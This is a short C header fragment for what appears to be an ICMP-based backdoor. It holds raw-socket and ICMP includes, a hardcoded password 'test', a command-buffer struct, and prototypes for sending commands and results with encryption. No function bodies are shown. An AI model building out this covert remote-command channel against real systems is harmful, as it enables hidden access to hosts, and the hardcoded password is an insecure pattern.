#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#define PASSWORD "test"
#define BUFSIZE 1024

struct bd_data
{
  u_int len;
  char cmd[BUFSIZE];
};

int send_result(u_int *dst_ip, char *result, u_int len);
int send_request(char *dst_ip, char *cmd);
int recv_response(void);
void decrypt(char *inbuf, char *outbuf, int blklen, char *key);
void encrypt(char *inbuf, char *outbuf, int blklen, char *key);
